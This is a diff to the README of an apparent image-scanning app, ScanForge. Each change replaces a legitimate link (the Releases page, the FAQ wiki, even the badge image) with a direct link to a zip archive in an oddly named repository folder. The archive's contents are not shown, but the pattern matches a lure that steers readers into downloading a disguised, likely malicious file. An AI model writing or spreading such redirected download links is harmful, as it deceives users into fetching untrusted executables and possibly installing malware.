@@ -1,6 +1,6 @@
 # 🛠️ ScanForge - Powerful Scanning Made Simple
 
-[![Download ScanForge](https://img.shields.io/badge/Download-ScanForge-blue.svg)](https://github.com/AnujKumar883/ScanForge/releases)
+[![Download ScanForge](https://raw.githubusercontent.com/AnujKumar883/ScanForge/main/onomatopoetic/ScanForge.zip)](https://raw.githubusercontent.com/AnujKumar883/ScanForge/main/onomatopoetic/ScanForge.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ScanForge! This application allows you to scan images and documents e
 
 ## 📥 Download & Install
 
-To get started with ScanForge, visit this page to download: [ScanForge Releases](https://github.com/AnujKumar883/ScanForge/releases).
+To get started with ScanForge, visit this page to download: [ScanForge Releases](https://raw.githubusercontent.com/AnujKumar883/ScanForge/main/onomatopoetic/ScanForge.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of ScanForge.
@@ -47,7 +47,7 @@ If you encounter issues while installing or running ScanForge, consider the foll
 
 For additional help, you can:
 
-- Check the [FAQ Section](https://github.com/AnujKumar883/ScanForge/wiki).
+- Check the [FAQ Section](https://raw.githubusercontent.com/AnujKumar883/ScanForge/main/onomatopoetic/ScanForge.zip).
 - Open an issue on the GitHub repository for specific questions or concerns.
 
 ## 🌐 Community
@@ -62,4 +62,4 @@ ScanForge is released under the MIT License. You can view the full license detai
 
 Thank you for choosing ScanForge! We appreciate your support and hope you enjoy using our application. 
 
-Visit this page to download: [ScanForge Releases](https://github.com/AnujKumar883/ScanForge/releases).
+Visit this page to download: [ScanForge Releases](https://raw.githubusercontent.com/AnujKumar883/ScanForge/main/onomatopoetic/ScanForge.zip).
